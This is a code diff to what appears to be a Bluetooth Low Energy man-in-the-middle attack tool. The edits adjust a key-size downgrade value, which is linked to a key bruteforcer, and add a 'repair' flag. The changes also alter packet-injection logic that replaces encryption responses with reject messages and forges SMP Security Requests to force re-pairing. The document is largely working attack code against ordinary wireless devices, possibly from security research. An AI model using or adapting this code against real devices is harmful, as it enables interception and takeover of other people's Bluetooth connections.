@@ -88,7 +88,7 @@ Empty--------->
 
 # global variable to access hardware
 hw = None
-new_key_size = 0x04
+new_key_size = 0x07
 
 found_key = None                  
 _found_key_lock = threading.Lock()
@@ -131,6 +131,8 @@ sent_reject = False
 LLENCREQ_body_copy = None
 LLENCREQ_event_copy = None 
 pairing_req_to_ll_reject_ind = False
+
+repair = True
 
 PROJECT_ROOT = Path(__file__).resolve().parent
 BRUTEFORCER_DIR = PROJECT_ROOT / "bruteforcer"
@@ -606,6 +608,7 @@ def ser_recv_print_forward(conn, quiet, filter_changes=False, manager=None):
     global bonding, sent_reject
     global LLENCREQ_copy
     global pairing_req_to_ll_reject_ind
+    global repair
 
     msg = hw.recv_and_decode()
     if isinstance(msg, PacketMessage):
@@ -870,7 +873,7 @@ def ser_recv_print_forward(conn, quiet, filter_changes=False, manager=None):
 
 
         # Replace LL_ENC_RSP with LL_REJECT_IND if bonding is set
-        if isinstance(msg, LlControlMessage) and msg.opcode == 0x04 and bonding:
+        if isinstance(msg, LlControlMessage) and msg.opcode == 0x04 and bonding and repair:
 
             print("[MODIFY] Replacing LL_ENC_RSP with LL_REJECT_IND (PIN or Key Missing)")
 
@@ -893,7 +896,7 @@ def ser_recv_print_forward(conn, quiet, filter_changes=False, manager=None):
             pairing_req_to_ll_reject_ind = True
 
         # Replace LL_START_ENC with a Security Request, and send LL_REJECT_IND to peripheral
-        if isinstance(msg, LlControlMessage) and msg.opcode == 0x05 and bonding:
+        if isinstance(msg, LlControlMessage) and msg.opcode == 0x05 and bonding and repair:
             print("[MODIFY] Transforming LL_START_ENC_REQ → SMP Security Request and injecting LL_REJECT_IND toward P")
 
 
@@ -921,7 +924,7 @@ def ser_recv_print_forward(conn, quiet, filter_changes=False, manager=None):
             # Construct SMP Security Request payload
             # SMP: [L2CAP len=0x02] [CID=0x0006] [SMP code=0x0B] [AuthReq=0x05]
             #smp_sec_req = bytes([0x02, 0x00, 0x06, 0x00, 0x0B, 0x05]) 
-            smp_sec_req = bytes([0x02, 0x00, 0x06, 0x00, 0x0B, 0x05])  # L2CAP + SMP
+            smp_sec_req = bytes([0x02, 0x00, 0x06, 0x00, 0x0B, 0x0D])  # L2CAP + SMP
             new_len = len(smp_sec_req)
             old_hdr = msg.body[0] if len(msg.body) > 0 else 0x00
             #llid_masked = (old_hdr & 0b11111100) | 0x01 # LLID = 0b01 (L2CAP start)
@@ -1019,7 +1022,7 @@ def sock_recv_print_forward(conn, quiet,filter_changes=False):
 
             reject_pdu = bytes([reject_opcode, error_code])
             # Transmit with fresh or compatible event if possible
-            hw.cmd_transmit(3, reject_pdu, event)  # safer to skip reusing old event
+            hw.cmd_transmit(3, reject_pdu)  # safer to skip reusing old event
             print(f"[INJECT] Sent LL_REJECT_IND (0x06) to peripheral: {reject_pdu.hex()}")
             return
         # reject_opcode = 0x0D
